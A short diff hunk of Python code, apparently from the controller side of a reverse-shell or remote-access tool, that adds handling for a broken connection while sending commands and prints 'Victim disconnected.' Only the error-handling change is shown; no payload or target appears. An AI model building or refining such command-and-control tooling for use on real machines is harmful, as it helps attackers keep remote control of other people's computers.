@@ -17,7 +17,11 @@ while True:
         client_socket.send(command.encode())
         break
 
-    client_socket.send(command.encode())
+    try:
+        client_socket.send(command.encode())
+    except BrokenPipeError:
+        print("Connection lost. Victim disconnected.")
+        break
 
     try:
         response = client_socket.recv(65535)
